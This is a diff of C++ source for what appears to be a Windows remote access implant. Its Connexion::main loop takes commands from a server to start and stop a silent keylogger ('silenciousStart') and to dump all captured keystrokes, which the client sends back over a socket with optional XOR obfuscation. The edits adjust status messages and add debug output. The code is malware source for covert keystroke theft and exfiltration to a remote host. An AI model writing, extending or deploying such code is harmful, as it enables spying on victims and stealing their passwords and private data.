@@ -179,7 +179,6 @@ INT Connexion::main()
                 {
                     wcout << "directcp" << endl;
                     a_keylogger->directTcp();
-        
                 } 
 
 
@@ -189,12 +188,12 @@ INT Connexion::main()
                     if(a_keylogger->silenciousStart())
                     {
                         //if  error
-                        status = L"MOD_KEYLOGGER:" SPLIT  "False";
+                        status = L"MOD_KEYLOGGER:start_silencious:" SPLIT  "False";
                     }
                     else
                     {
                         //if not error
-                        status = L"MOD_KEYLOGGER:" SPLIT  "True";
+                        status = L"MOD_KEYLOGGER:start_silencious:" SPLIT  "True";
                     }
                     sendSafe(status);
                 }
@@ -206,12 +205,14 @@ INT Connexion::main()
                     if(a_keylogger->silenciousStop())
                     {
                         //if error
-                        status = L"MOD_KEYLOGGER:" SPLIT "False";
+                        wcout << "stop_silencious error" << endl;
+                        status = L"MOD_KEYLOGGER:stop_silencious:" SPLIT "False";
                     }
                     else
                     {
                         //if not error
-                        status =  status = L"MOD_KEYLOGGER:" SPLIT "True";
+                        wcout << "stop_silencious if not error" << endl;
+                        status = L"MOD_KEYLOGGER:stop_silencious:" SPLIT "True";
                     }
                 }
 
@@ -220,10 +221,9 @@ INT Connexion::main()
                 {
                   wcout << "in dump_all" << endl;
                    vector<string> dump_all = a_keylogger->dumpAllData();
-                   sendCommandSafe(dump_all,FALSE);
+                   sendCommandSafe(dump_all);
                    dump_all.clear();
                 }
-
                 wcout << "in Connexion !" << endl;
             }
 
@@ -253,7 +253,7 @@ wstring Connexion::recvSafe()
     //allows you to receive data while managing errors 
     WCHAR buffer[BUFFER_LEN] = {0};
     INT len_recv;
-    wstring result = L"";
+    wstring result;
 
     len_recv=recv(a_sock,(char *)buffer, sizeof(buffer), 0);
         
@@ -293,7 +293,8 @@ Once the function is finished send "\r\n" to signal to the server that the clien
             request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));    
         }
         else
-        {
+        {   
+            wcout <<  "Not encrypted request" << endl;
             request = ConvertUtf8ToWide(result_of_command[i]);
         }
         send(a_sock, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
